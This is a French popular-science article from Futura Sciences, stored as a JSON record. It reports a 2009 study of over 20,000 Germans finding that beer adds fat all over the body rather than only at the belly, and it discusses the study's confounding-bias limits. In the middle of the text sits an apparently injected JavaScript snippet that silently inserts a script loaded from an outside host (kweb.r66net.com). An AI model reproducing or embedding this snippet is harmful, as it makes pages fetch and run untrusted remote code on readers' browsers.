{"title": "Science décalée : la bière n’est pas responsable des abdos Kronenbourg !", "newspaper": "Futura Sciences", "author": "Par Janlou Chaput, Futura", "date_publi": "04/12/2016", "content": "Alors que la bière belge vient d'être inscrite par l'Unesco au «  patrimoine culturel immatériel de l'humanité  », nous profitons de l'occasion pour nous souvenir d'une étude à la fois très sérieuse et décalée consacrée à ce brevage et ses conséquences facheuses sur notre tour de taille. Menée sur 20.000 Allemands, cette étude parue en 2009 affirmait que les « abdos Kronenbourg » comme on les appelle couramment, ne sont pas imputables à la bière... puisqu'elle fait grossir de partout et pas uniquement de la panse.  Les idées reçues ont parfois la dent dure. Ainsi, on pense que l' obésité  abdominale est due à une consommation excessive de bière, d'où les fameux « abdos Kronenbourg ». Mythe ou réalité ? Des scientifiques ont apporté une réponse et ont désormais une chance raisonnable de figurer au palmarès des  prix Ignobel . Le contexte : des tablettes de chocolat aux abdos Kronenbourg L'Homme est particulièrement doué pour établir des liens entre différents événements, comme la consommation d'un aliment qui sentait mauvais et le mal de ventre qui s'ensuit. Ainsi, il n'aura pas échappé à certains fins observateurs que des grands consommateurs de  bières  présentaient parfois une  panse  particulièrement proéminente, tandis que le reste du corps ne semblait pas avoir été déformé par la boisson à base de malt fermenté. En comparaison aux  tablettes  de chocolat qui caractérisent des muscles  abdominaux  bien dessinés, on associe aux buveurs ventrus les « abdos Kronenbourg », en référence à la marque de bière française la plus célèbre.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La science, s'attelant à vérifier par les faits, s'est attaquée à ce problème pour le moins fondamental... Le mérite en revient à des chercheurs suédois de l' université de Göteborg  qui sont descendus mener leur étude dans l'un des pays de la bière : l'Allemagne. Armés d'un mètre, d'une balance et de morceaux de papier, ils sont allés vérifier le lien de causalité entre la consommation de bière et le tour de taille. Car les abdos Kronenbourg, les vrais, sont ceux qui se manifestent par une prise de graisse uniquement au niveau de l' abdomen . Qu'en ont-ils conclu ? L’étude : la bière mise hors de cause La recherche a été publiée dans l' European Journal of Clinical Nutrition . Plus de 20.000 Germains se sont portés volontaires pour cette expérience originale. Les sujets étaient pesés, leurs  tour de taille  et tour de hanche mesurés. Ils se devaient aussi de répondre à un questionnaire sur leur descente quotidienne de bière, en se basant sur le nombre de bouteilles ou de pintes aux formats standards vidées. La bière est consommée à travers le monde. Issue de la fermentation du malt et du houblon, les plus anciennes traces de sa consommation remonteraient au IV e  millénaire av. J.-C. © mfajardo, Fotopédia, cc by nc nd 2.0                               Hommes et femmes étaient alors rangés dans de grandes catégories, dont les paramètres différaient selon le genre. Les Allemandes étaient regroupées en quatre classes, allant des abstinentes jusqu'aux buveuses modérées (à partir de 250 ml par jour). Les hommes, plus souvent enclins aux excès, bénéficiaient d'une catégorie supplémentaire : les gros buveurs. À titre de comparaison et à mettre en  regard  avec les données chez la femme, un homme était considéré comme un consommateur modéré lorsqu'il transitait chaque jour dans son gosier entre 500 ml et 1 litre de breuvage... Les travaux montrent que la bière rend effectivement certains Teutons bedonnants, mais qu'ils ne prennent pas uniquement au niveau abdominal. Comme ils l'écrivent dans leur article, «  la consommation de bière semble plutôt associée à une augmentation des graisses sur l'ensemble du corps  ». Cependant, les abdos Kronenbourg se restreignant à une prise de  volume  au seul niveau de la panse, on sort de la définition de base. La  bière  n'est donc pas la coupable de cet excès graisseux ! L’œil extérieur : de l'art d'être bon vivant Rappelons quand même qu'il est difficile, dans ce genre d'étude, d'aboutir à des conclusions fermes et définitives. Les auteurs le conçoivent. Ce travail, aussi sérieux a-t-il été, se trouve limité par la précision des personnes interrogées dans leurs réponses, et par la non-prise en compte de nombreux autres facteurs extérieurs. Il ne paraît pas  aberrant  de considérer que dans la catégorie des gros buveurs on trouve beaucoup de « bons vivants », comme on les appelle, ceux-là mêmes qui aiment la bonne chère et ne se satisfont pas d'une salade d' aubergine , sauf si, à la limite, elle accompagne une choucroute bien garnie. Leur appétit pour la bière et pour la nourriture pourrait donc entraîner une confusion dans l'interprétation, ce que les scientifiques appellent un biais. C'est en ce sens qu'une étude de  2003  menée en République tchèque a conclu. La certitude absolue ne peut donc exister, à moins que l' alimentation  soit parfaitement contrôlée. Mais il est bien évident qu'un tel  protocole  serait inévitablement contraignant, et l'intérêt d'imposer un tel régime alimentaire pour vérifier la véracité d'une expression populaire est franchement contestable. Même si, à n'en pas douter, les chercheurs trouveraient des volontaires. Qui se dévoueraient, bien sûr, au nom de la science. ", "theme": "sante"}